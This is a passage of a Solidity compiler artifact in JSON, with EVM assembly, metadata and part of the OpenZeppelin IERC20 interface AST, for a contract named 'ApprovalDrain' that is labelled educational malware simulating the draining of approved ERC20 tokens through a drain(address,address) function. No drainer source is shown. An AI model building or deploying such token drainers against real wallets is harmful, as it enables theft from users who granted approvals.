											"end": 2149,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2131,
											"end": 2138,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2127,
											"end": 2150,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 2123,
											"end": 2155,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 2120,
											"end": 2239,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2120,
											"end": 2239,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2120,
											"end": 2239,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2158,
											"end": 2237,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2158,
											"end": 2237,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 2158,
											"end": 2237,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2158,
											"end": 2237,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2158,
											"end": 2237,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2120,
											"end": 2239,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2120,
											"end": 2239,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2278,
											"end": 2279,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2303,
											"end": 2367,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2359,
											"end": 2366,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2350,
											"end": 2356,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2339,
											"end": 2348,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 2335,
											"end": 2357,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2303,
											"end": 2367,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 2303,
											"end": 2367,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2303,
											"end": 2367,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2303,
											"end": 2367,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2293,
											"end": 2367,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2293,
											"end": 2367,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2249,
											"end": 2377,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2033,
											"end": 2384,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2033,
											"end": 2384,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2033,
											"end": 2384,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2033,
											"end": 2384,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2033,
											"end": 2384,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2390,
											"end": 2508,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 2390,
											"end": 2508,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2477,
											"end": 2501,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2495,
											"end": 2500,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2477,
											"end": 2501,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 2477,
											"end": 2501,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2477,
											"end": 2501,
											"name": "tag",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2477,
											"end": 2501,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2472,
											"end": 2475,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2465,
											"end": 2502,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2390,
											"end": 2508,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2390,
											"end": 2508,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2390,
											"end": 2508,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "tag",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2663,
											"end": 2667,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2701,
											"end": 2703,
											"name": "PUSH",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 2690,
											"end": 2699,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2686,
											"end": 2704,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2678,
											"end": 2704,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2678,
											"end": 2704,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2714,
											"end": 2785,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2782,
											"end": 2783,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2771,
											"end": 2780,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2767,
											"end": 2784,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2758,
											"end": 2764,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 2714,
											"end": 2785,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 2714,
											"end": 2785,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2714,
											"end": 2785,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2714,
											"end": 2785,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2795,
											"end": 2867,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2863,
											"end": 2865,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2852,
											"end": 2861,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2848,
											"end": 2866,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2839,
											"end": 2845,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 2795,
											"end": 2867,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 2795,
											"end": 2867,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2795,
											"end": 2867,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2795,
											"end": 2867,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2877,
											"end": 2949,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2945,
											"end": 2947,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 2934,
											"end": 2943,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2930,
											"end": 2948,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2921,
											"end": 2927,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2877,
											"end": 2949,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 2877,
											"end": 2949,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2877,
											"end": 2949,
											"name": "tag",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2877,
											"end": 2949,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "SWAP5",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2514,
											"end": 2956,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2962,
											"end": 3052,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 2962,
											"end": 3052,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2996,
											"end": 3003,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3039,
											"end": 3044,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3032,
											"end": 3045,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3025,
											"end": 3046,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3014,
											"end": 3046,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3014,
											"end": 3046,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2962,
											"end": 3052,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2962,
											"end": 3052,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2962,
											"end": 3052,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2962,
											"end": 3052,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3058,
											"end": 3174,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 3058,
											"end": 3174,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3128,
											"end": 3149,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "75"
										},
										{
											"begin": 3143,
											"end": 3148,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3128,
											"end": 3149,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 3128,
											"end": 3149,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3128,
											"end": 3149,
											"name": "tag",
											"source": 2,
											"value": "75"
										},
										{
											"begin": 3128,
											"end": 3149,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3121,
											"end": 3126,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3118,
											"end": 3150,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 3108,
											"end": 3168,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 3108,
											"end": 3168,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3164,
											"end": 3165,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3161,
											"end": 3162,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3154,
											"end": 3166,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 3108,
											"end": 3168,
											"name": "tag",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 3108,
											"end": 3168,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3058,
											"end": 3174,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3058,
											"end": 3174,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3180,
											"end": 3317,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 3180,
											"end": 3317,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3234,
											"end": 3239,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3265,
											"end": 3271,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3259,
											"end": 3272,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3250,
											"end": 3272,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3250,
											"end": 3272,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3281,
											"end": 3311,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 3305,
											"end": 3310,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3281,
											"end": 3311,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 3281,
											"end": 3311,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3281,
											"end": 3311,
											"name": "tag",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 3281,
											"end": 3311,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3180,
											"end": 3317,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3180,
											"end": 3317,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3180,
											"end": 3317,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3180,
											"end": 3317,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3180,
											"end": 3317,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3323,
											"end": 3668,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3323,
											"end": 3668,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3390,
											"end": 3396,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3439,
											"end": 3441,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3427,
											"end": 3436,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3418,
											"end": 3425,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3414,
											"end": 3437,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3410,
											"end": 3442,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 3407,
											"end": 3526,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3407,
											"end": 3526,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 3407,
											"end": 3526,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3445,
											"end": 3524,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "81"
										},
										{
											"begin": 3445,
											"end": 3524,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 3445,
											"end": 3524,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3445,
											"end": 3524,
											"name": "tag",
											"source": 2,
											"value": "81"
										},
										{
											"begin": 3445,
											"end": 3524,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3407,
											"end": 3526,
											"name": "tag",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 3407,
											"end": 3526,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3565,
											"end": 3566,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3590,
											"end": 3651,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "82"
										},
										{
											"begin": 3643,
											"end": 3650,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3634,
											"end": 3640,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3623,
											"end": 3632,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 3619,
											"end": 3641,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3590,
											"end": 3651,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 3590,
											"end": 3651,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3590,
											"end": 3651,
											"name": "tag",
											"source": 2,
											"value": "82"
										},
										{
											"begin": 3590,
											"end": 3651,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3580,
											"end": 3651,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3580,
											"end": 3651,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3536,
											"end": 3661,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3323,
											"end": 3668,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3323,
											"end": 3668,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3323,
											"end": 3668,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3323,
											"end": 3668,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3323,
											"end": 3668,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"@openzeppelin/contracts/token/ERC20/IERC20.sol",
								"M/Approval Drain Malware.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"drain(address,address)": "837971e4"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"}],\"name\":\"drain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"title\":\"Approval Drain Malware (Educational Use Only)\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"notice\":\"Simulates a malicious contract that drains approved ERC20 tokens\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"M/Approval Drain Malware.sol\":\"ApprovalDrain\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0xe06a3f08a987af6ad2e1c1e774405d4fe08f1694b67517438b467cecf0da0ef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df6f0c459663c9858b6cba2cda1d14a7d05a985bed6d2de72bd8e78c25ee79db\",\"dweb:/ipfs/QmeTTxZ7qVk9rjEv2R4CpCwdf8UMCcRqDNMvzNxHc3Fnn9\"]},\"M/Approval Drain Malware.sol\":{\"keccak256\":\"0xce7301109b97d271a66f25572ec4ea71e580f6072e0693cac6c8596c2b91997d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://e979e38bc5c4dc2e7919922599c793a383ccaa440b9b50085a99d84a70515964\",\"dweb:/ipfs/QmZdrqreQhc2PtN2ubPMeVK4Gsemcq1ns4pdL5NzitFAhu\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"notice": "Simulates a malicious contract that drains approved ERC20 tokens",
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							77
						]
					},
					"id": 78,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".20"
							],
							"nodeType": "PragmaDirective",
							"src": "106:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IERC20",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "132:71:0",
								"text": " @dev Interface of the ERC-20 standard as defined in the ERC."
							},
							"fullyImplemented": false,
							"id": 77,
							"linearizedBaseContracts": [
								77
							],
							"name": "IERC20",
							"nameLocation": "214:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "227:158:0",
										"text": " @dev Emitted when `value` tokens are moved from one account (`from`) to\n another (`to`).\n Note that `value` may be zero."
									},
									"eventSelector": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
									"id": 11,
									"name": "Transfer",
									"nameLocation": "396:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"indexed": true,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "421:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "405:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "405:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"indexed": true,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "443:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "427:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 6,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "427:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 9,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "455:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "447:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 8,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "447:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "404:57:0"
									},
									"src": "390:72:0"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 12,
										"nodeType": "StructuredDocumentation",
										"src": "468:148:0",
										"text": " @dev Emitted when the allowance of a `spender` for an `owner` is set by\n a call to {approve}. `value` is the new allowance."
									},
									"eventSelector": "8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
									"id": 20,
									"name": "Approval",
									"nameLocation": "627:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 14,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "652:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "636:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 13,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "636:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 16,
												"indexed": true,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "675:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "659:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 15,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "659:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 18,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "692:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "684:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 17,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "684:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "635:63:0"
									},
									"src": "621:78:0"
								},
								{
									"documentation": {
										"id": 21,
										"nodeType": "StructuredDocumentation",
										"src": "705:65:0",
										"text": " @dev Returns the value of tokens in existence."
									},
									"functionSelector": "18160ddd",
									"id": 26,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nameLocation": "784:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "795:2:0"
									},
									"returnParameters": {
										"id": 25,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 24,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 26,
												"src": "821:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 23,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "821:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "820:9:0"
									},
									"scope": 77,
									"src": "775:55:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 27,
										"nodeType": "StructuredDocumentation",
										"src": "836:71:0",
										"text": " @dev Returns the value of tokens owned by `account`."
									},
									"functionSelector": "70a08231",
									"id": 34,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nameLocation": "921:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 29,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "939:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "931:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 28,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "931:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "930:17:0"
									},
									"returnParameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 32,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "971:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 31,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "971:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "970:9:0"
									},
									"scope": 77,
									"src": "912:68:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 35,
										"nodeType": "StructuredDocumentation",
										"src": "986:213:0",
										"text": " @dev Moves a `value` amount of tokens from the caller's account to `to`.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "a9059cbb",
									"id": 44,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nameLocation": "1213:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 37,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "1230:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1222:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 36,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1222:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 39,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "1242:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1234:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 38,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1234:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1221:27:0"
									},
									"returnParameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1267:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 41,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1267:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1266:6:0"
									},
									"scope": 77,
									"src": "1204:69:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 45,
										"nodeType": "StructuredDocumentation",
										"src": "1279:264:0",
